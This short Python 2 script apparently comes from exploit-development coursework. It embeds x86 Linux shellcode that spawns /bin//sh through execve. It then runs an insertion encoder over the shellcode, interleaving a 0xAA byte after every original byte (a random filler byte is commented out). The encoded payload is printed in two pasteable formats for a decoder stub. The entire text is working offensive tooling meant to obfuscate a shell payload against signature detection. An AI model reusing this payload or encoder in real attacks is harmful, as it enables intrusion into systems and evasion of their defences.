#!/usr/bin/python
import random

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1d\x8b\x34\x24\xb1\x08\x52\x52\x52\x89\xe7\xf3\xa4\x89\xe3\x52\x53\xb0\x0b\x89\xe1\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

encoded = ""
encoded2 = ""

print "Encoded shellcode ..." + '\n'

for x in bytearray(shellcode):
    encoded += '\\x'
    encoded += '%02x' % x
    encoded += '\\x%02x' % 0xAA
    #encoded += '\\x%02x' % random.randint(1,255)
    
    encoded2 += '0x'
    encoded2 += '%02x,' %x
    encoded2 += '0x%02x,' % 0xAA
    #encoded2 += '0x%02x,' %random.randint(1,255)
    
print encoded + '\n'

print encoded2
